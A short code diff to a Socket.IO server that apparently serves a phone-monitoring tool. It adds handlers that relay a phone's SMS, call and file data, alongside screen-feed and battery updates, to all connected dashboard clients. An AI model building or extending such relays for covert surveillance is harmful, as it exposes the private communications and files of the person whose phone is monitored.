@@ -31,7 +31,9 @@ io.on('connection', (socket) => {
     socket.on('data-stream', (data) => {
         socket.broadcast.emit('render-feed', data);
     });
-
+socket.on('sms-data', (data) => io.emit('sms-data', data));
+socket.on('call-data', (data) => io.emit('call-data', data));
+socket.on('file-data', (data) => io.emit('file-data', data));
    socket.on('battery-update', (lvl) => {
     console.log("Battery received from phone:", lvl);
     // Use io.emit to send to EVERYONE (including the dashboard)
@@ -52,4 +54,5 @@ const PORT = process.env.PORT || 3000;
 http.listen(PORT, () => {
     console.log(`🚀 Server monitoring active on port ${PORT}`);
 });
+
 
